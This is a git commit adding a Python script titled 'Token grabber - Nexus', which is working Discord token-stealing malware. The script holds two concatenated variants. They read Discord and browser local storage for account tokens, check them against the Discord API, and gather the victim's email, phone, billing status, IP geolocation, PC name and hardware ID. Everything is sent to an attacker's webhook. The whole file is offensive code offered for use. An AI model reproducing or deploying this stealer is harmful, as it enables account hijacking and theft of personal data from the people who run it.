9048cfd4b486666b6fea6ee812d4b028f7087daf
aniko33 <76649588+aniko33@users.noreply.github.com>
2021-07-31 14:15:41 +0200

    Add files via upload

---
+++ Token grabber - Nexus.py
@@ -0,0 +1,325 @@
+import requests
+import json
+import os
+import re
+from dhooks import Webhook, Embed
+from datetime import datetime
+
+hook = Webhook("WEBHOOK HERE")
+
+time = datetime.now().strftime("%H:%M %p")  
+ip = requests.get('https://api.ipify.org/').text
+
+r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
+geo = r.json()
+embed = Embed()
+fields = [
+    {'name': 'IP', 'value': geo['query']},
+    {'name': 'ipType', 'value': geo['ipType']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'City', 'value': geo['city']},
+    {'name': 'Continent', 'value': geo['continent']},
+    {'name': 'Country', 'value': geo['country']},
+    {'name': 'IPName', 'value': geo['ipName']},
+    {'name': 'ISP', 'value': geo['isp']},
+    {'name': 'Latitudine', 'value': geo['lat']},
+    {'name': 'Longitudine', 'value': geo['lon']},
+    {'name': 'Org', 'value': geo['org']},
+    {'name': 'Regione', 'value': geo['region']},
+    {'name': 'Stato', 'value': geo['status']},
+]
+for field in fields:
+    if field['value']:
+        embed.add_field(name=field['name'], value=field['value'], inline=True)
+hook.send(embed=embed)
+
+from urllib.request import Request, urlopen
+
+WEBHOOK_URL = 'WEBHOOK HERE'
+
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()
+
+import os
+if os.name != "nt":
+	exit()
+from re import findall
+import json
+import platform as plt
+from json import loads, dumps
+from base64 import b64decode
+from subprocess import Popen, PIPE
+from urllib.request import Request, urlopen
+from datetime import datetime
+
+webhook_url = "WEBHOOK HERE"
+
+languages = {
+	'da'    : 'Danish, Denmark',
+	'de'    : 'German, Germany',
+	'en-GB' : 'English, United Kingdom',
+	'en-US' : 'English, United States',
+	'es-ES' : 'Spanish, Spain',
+	'fr'    : 'French, France',
+	'hr'    : 'Croatian, Croatia',
+	'lt'    : 'Lithuanian, Lithuania',
+	'hu'    : 'Hungarian, Hungary',
+	'nl'    : 'Dutch, Netherlands',
+	'no'    : 'Norwegian, Norway',
+	'pl'    : 'Polish, Poland',
+	'pt-BR' : 'Portuguese, Brazilian, Brazil',
+	'ro'    : 'Romanian, Romania',
+	'fi'    : 'Finnish, Finland',
+	'sv-SE' : 'Swedish, Sweden',
+	'vi'    : 'Vietnamese, Vietnam',
+	'tr'    : 'Turkish, Turkey',
+	'cs'    : 'Czech, Czechia, Czech Republic',
+	'el'    : 'Greek, Greece',
+	'bg'    : 'Bulgarian, Bulgaria',
+	'ru'    : 'Russian, Russia',
+	'uk'    : 'Ukranian, Ukraine',
+	'th'    : 'Thai, Thailand',
+	'zh-CN' : 'Chinese, China',
+	'ja'    : 'Japanese',
+	'zh-TW' : 'Chinese, Taiwan',
+	'ko'    : 'Korean, Korea'
+}
+
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+	"Discord"           : ROAMING + "\\Discord",
+	"Discord Canary"    : ROAMING + "\\discordcanary",
+	"Discord PTB"       : ROAMING + "\\discordptb",
+	"Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
+	"Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+	"Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+	"Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
+}
+def getheaders(token=None, content_type="application/json"):
+	headers = {
+		"Content-Type": content_type,
+		"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
+	}
+	if token:
+		headers.update({"Authorization": token})
+	return headers
+def getuserdata(token):
+	try:
+		return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
+	except:
+		pass
+def gettokens(path):
+	path += "\\Local Storage\\leveldb"
+	tokens = []
+	for file_name in os.listdir(path):
+		if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+			continue
+		for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
+			for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+				for token in findall(regex, line):
+					tokens.append(token)
+	return tokens
+
+def gethwid():
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
+
+def getip():
+	ip = org = loc = city = country = region = googlemap = "None"
+	try:
+		url = 'http://ipinfo.io/json'
+		response = urlopen(url)
+		data = json.load(response)
+		ip = data['ip']
+		org = data['org']
+		loc = data['loc']
+		city = data['city']
+		country = data['country']
+		region = data['region']
+		googlemap = "https://www.google.com/maps/search/google+map++" + loc
+	except:
+		pass
+	return ip,org,loc,city,country,region,googlemap
+
+def getavatar(uid, aid):
+	url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
+	try:
+		urlopen(Request(url))
+	except:
+		url = url[:-4]
+	return url
+
+def has_payment_methods(token):
+	try:
+		return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
+	except:
+		pass
+
+def main():
+	embeds = []
+	working = []
+	checked = []
+	already_cached_tokens = []
+	working_ids = []
+	computer_os = plt.platform()
+	ip,org,loc,city,country,region,googlemap = getip()
+	pc_username = os.getenv("UserName")
+	pc_name = os.getenv("COMPUTERNAME")
+	for platform, path in PATHS.items():
+		if not os.path.exists(path):
+			continue
+		for token in gettokens(path):
+			if token in checked:
+				continue
+			checked.append(token)
+			uid = None
+			if not token.startswith("mfa."):
+				try:
+					uid = b64decode(token.split(".")[0].encode()).decode()
+				except:
+					pass
+				if not uid or uid in working_ids:
+					continue
+			user_data = getuserdata(token)
+			if not user_data:
+				continue
+			working_ids.append(uid)
+			working.append(token)
+			username = user_data["username"] + "#" + str(user_data["discriminator"])
+			user_id = user_data["id"]
+			locale = user_data['locale']
+			avatar_id = user_data["avatar"]
+			avatar_url = getavatar(user_id, avatar_id)
+			email = user_data.get("email")
+			phone = user_data.get("phone")
+			verified = user_data['verified']
+			mfa_enabled = user_data['mfa_enabled']
+			flags = user_data['flags']
+
+			creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y・%H:%M:%S')
+
+			language = languages.get(locale)
+			nitro = bool(user_data.get("premium_type"))
+			billing = bool(has_payment_methods(token))
+			embed = {
+				"color": 15158332,
+				"fields": [
+					{
+						"name": "**Account Info**",
+						"value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
+						"inline": True
+					},
+					{
+						"name": "**PC Info**",
+						"value": f'OS: {computer_os}\n \nUsername: {pc_username}\n \nPc Name: {pc_name}\n \n Hwid:\n \n{gethwid()}',
+						"inline": True
+					},
+					{
+						"name": "--------------------------------------------------------------------------------------------------",
+						"value":"-----------------------------------------------------------------------------------------------",
+						"inline": False
+					},
+					{
+						"name": "**IP**",
+						"value": f'IP: {ip}\nMap location: [{loc}]({googlemap})\nCity: {city}\nRegion: {region}\nOrg: {org}',
+						"inline": True
+					},
+					{
+						"name": "**Other Info**",
+						"value": f'Locale: {locale} ({language})\nToken Location: {platform}\nEmail Verified: {verified}\n2fa Enabled: {mfa_enabled}\nCreation Date: {creation_date}',
+						"inline": True
+					},
+					{
+						"name": "**Token**",
+						"value": f"`{token}`",
+						"inline": False
+					}
+				],
+				"author": {
+					"name": f"{username}・{user_id}",
+					"icon_url": avatar_url
+				},
+				"footer": {
+					"text": "Aniko - https://valiomkalik.web.app"
+				}
+			}
+			embeds.append(embed)
+
+	if len(working) == 0:
+		working.append('123')
+	webhook = {
+		"content": "",
+		"embeds": embeds,
+		"username": "Nexus",
+		"avatar_url": "https://blogs.esa.int/space19plus/files/2019/03/nebula.jpg"
+	}
+	try:
+		urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))
+	except:
+		pass
+
+if __name__ == "__main__":
+    main()
